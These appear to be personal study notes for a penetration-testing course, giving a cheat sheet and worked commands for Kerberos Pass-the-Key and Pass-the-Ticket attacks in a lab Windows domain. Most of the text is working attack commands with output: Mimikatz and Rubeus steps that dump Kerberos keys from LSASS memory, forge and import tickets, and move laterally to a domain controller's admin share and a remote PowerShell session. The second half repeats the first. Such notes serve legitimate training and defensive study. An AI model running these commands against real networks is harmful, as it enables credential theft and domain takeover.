## (Pass the keys) Forging TGT Keys from NTLMs

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.

# Cheat Sheet

- **Dump tickets (Mimikatz):** `sekurlsa::tickets /export`  
- **Dump tickets (Rubeus):** `Rubeus.exe dump /nowrap`  
- **Dump keys:** `sekurlsa::ekeys`  
- **Forge TGT (Mimikatz):** `sekurlsa::pth /domain:<dom> /user:<u> /ntlm:<hash>`  
- **Forge TGT (Rubeus):** `Rubeus.exe asktgt /domain:<dom> /user:<u> /aes256:<key>`  
- **Import ticket (Mimikatz):** `kerberos::ptt <ticket.kirbi>`  
- **Import ticket (Rubeus):** `Rubeus.exe ptt /ticket:<kirbi>` or `/ticket:<b64>`  
- **Remote session:** `Enter-PSSession -ComputerName <host>`


#### Mimikatz - Extract Kerberos keys

```cmd-session

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys

Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
```


use the keys to forge TGT (admin required)

```cmd-session
mimikatz # sekurlsa::pth /domain:blackwood.com /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

Forge TGT keys with rubeas `asktgt` by supplying Kerberos e-key: (no admin required)
```cmd-session
c:\tools> Rubeus.exe asktgt /domain:blackwood.com /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'blackwood.com\plaintext'
[+] TGT request successful!
[*] Base64(ticket.kirbi):

doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEXX

```

To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).



this technique forges the ticket and then imports it to current session
```cmd-session
c:\tools> Rubeus.exe asktgt /domain:blackwood.com /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
Note that now it displays `Ticket successfully imported!`.

## Pass the Ticket (PtT)


Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
import TGT ticket to session
```
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-blackwood.com.kirbi

*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.blackwood.com\c$
Directory: \\dc01.blackwood.com\c$
```

#### Convert .kirbi to Base64 Format

```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-blackwood.com.kirbi"))

doQhAAAAAMCAQKsuDA4CgsuSZcBSo/jMnDjucWNtlDc8ez6...SNIP...
```

pass the ticket can also be done with b64
```cmd-session
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/Vh
```

`kerberos::ptt` and the .kirbi file that contains the ticket we want to import.

#### Mimikatz - Pass the Ticket

Pass the Ticket (PtT) from Windows

```cmd-session
C:\tools> mimikatz.exe 


mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-blackwood.com.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-
 
plaintext@krbtgt-blackwood.com.kirbi': OK
mimikatz # exit
Bye!

c:\tools> dir \\DC01.blackwood.com\c$
```

we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.

## remoting after ptt
To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new `cmd.exe` and execute `mimikatz.exe`, then import the ticket we collected using `kerberos::ptt`

#### Mimikatz - Pass the Ticket for lateral movement.
```cmd-session
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-BLACKWOOD.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-BLACKWOOD.HTB.kirbi': OK

mimikatz # exit
Bye!
```

with rubeas
```cmd-session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
f `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

```cmd-session

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
Blackwood\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```


----
### replica/copied
# Pass-the-Ticket (PtT) – CTFS & CPTS

## 1. Extract Tickets

### With Mimikatz
```mimikatz
sekurlsa::tickets /export
```

### With Rubeus
```cmd
Rubeus.exe dump /nowrap
# Outputs tickets in BASE64
```

---

## 2. Extract Keys (for Forging TGTs)
Kerberos keys (AES/RC4) are encryption keys derived from a user’s password that let you forge valid Kerberos tickets without needing the plaintext password.
### With Mimikatz
```mimikatz
privilege::debug
sekurlsa::ekeys
```
extracts Kerberos encryption keys (NTLM/RC4, AES) for logged-in users directly from LSASS memory.

---

## 3. Forge TGT

### With Mimikatz (Admin required)
```mimikatz
sekurlsa::pth /domain:blackwood.com /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
→ Spawns a new `cmd.exe` in target user’s context.

### With Rubeus (No Admin required)
```cmd
Rubeus.exe asktgt /domain:blackwood.com /user:plaintext /aes256:b21c99fc068e3ab2... /nowrap
```

Auto-import ticket:
```cmd
Rubeus.exe asktgt /domain:blackwood.com /user:plaintext /rc4:3f74aa8f08f712f0... /ptt
```

---

## 4. Pass-the-Ticket (PtT)

### Import with Rubeus
```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-blackwood.com.kirbi
```

- **Using Base64 instead of file**:
```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/Vh
```

### Convert `.kirbi` → Base64
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-blackwood.com.kirbi"))
```

### With Mimikatz
```mimikatz
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\[0;6c680]-2-0-40e10000-plaintext@krbtgt-blackwood.com.kirbi"
```

→ Ticket successfully imported, access shares:
```cmd
dir \\DC01.blackwood.com\c$
```

---

## 5. Lateral Movement with PtT

### Mimikatz
```mimikatz
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-BLACKWOOD.HTB.kirbi"
```

### Rubeus (mimic runas /netonly)
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Then:
```powershell
Enter-PSSession -ComputerName DC01
whoami
hostname
```

---

